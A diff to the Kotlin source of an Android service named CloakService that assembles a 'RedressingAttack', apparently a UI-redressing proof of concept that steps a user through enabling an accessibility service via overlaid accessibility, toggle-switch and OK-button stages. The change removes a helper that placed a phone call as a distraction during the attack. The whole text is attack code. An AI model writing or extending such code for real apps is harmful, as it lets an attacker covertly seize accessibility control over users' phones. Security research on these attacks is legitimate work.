@@ -22,7 +22,6 @@ class CloakService : Service() {
     companion object {
         private val TAG: String = CloakService::class.java.name
         private const val ACTION_ENABLE_DAGGER_DISTRACTION = "enable_dagger"
-        private const val ACTION_PHONE_CALL_DISTRACTION = "action_distraction"
 
 
         fun startDaggerDistraction(context: Context) {
@@ -37,14 +36,6 @@ class CloakService : Service() {
                     .setFlags(flags))
         }
 
-        fun startPhoneCallDistraction(context: Context, phoneNumber: String) {
-            val phoneCallIntent = Intent(Intent.ACTION_CALL)
-            phoneCallIntent.data = Uri.parse(phoneNumber)
-            val distractionIntent = Intent(context, CloakService::class.java)
-            distractionIntent.action = CloakService.ACTION_PHONE_CALL_DISTRACTION
-            context.startService(distractionIntent)
-            context.startActivity(phoneCallIntent)
-        }
     }
 
     override fun onBind(intent: Intent?): IBinder? {
@@ -71,10 +62,6 @@ class CloakService : Service() {
                 stages.add(AccessibilityStage(applicationContext, listener))
                 stages.add(ToggleSwitchStage(applicationContext, listener))
                 stages.add(OkButtonStage(applicationContext, listener))
-            }
-
-            ACTION_PHONE_CALL_DISTRACTION -> {
-                stages.add(DistractionStage(applicationContext, listener))
             }
         }
         attack = RedressingAttack(stages)
